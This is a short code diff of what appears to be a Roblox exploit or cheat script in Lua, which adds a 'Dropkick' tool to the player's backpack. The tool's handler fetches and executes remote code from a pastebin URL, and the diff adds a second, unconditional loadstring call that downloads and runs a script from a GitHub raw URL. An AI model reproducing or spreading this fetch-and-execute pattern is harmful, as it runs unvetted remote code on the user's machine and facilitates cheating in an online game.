@@ -288,13 +288,14 @@ local function onAwakeningActivated()
     local dropkickTool = Instance.new("Tool")
     dropkickTool.Name = "20-20-20 Dropkick"  -- Tool name
     dropkickTool.RequiresHandle = false  -- No handle required
-    dropkickTool.ToolTip = "awakening"
 
     -- Function to execute when the Dropkick tool is activated
     local function onDropkickActivated()
         loadstring(game:HttpGet("https://pastebin.com/raw/g7Xjypk8"))()
     end
 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Herobrine697448/KJ/refs/heads/main/fiveseasons.lua"))()
+    
     -- Connect the activation function to the tool's Activated event
     dropkickTool.Activated:Connect(onDropkickActivated)
     dropkickTool.Parent = game.Players.LocalPlayer.Backpack
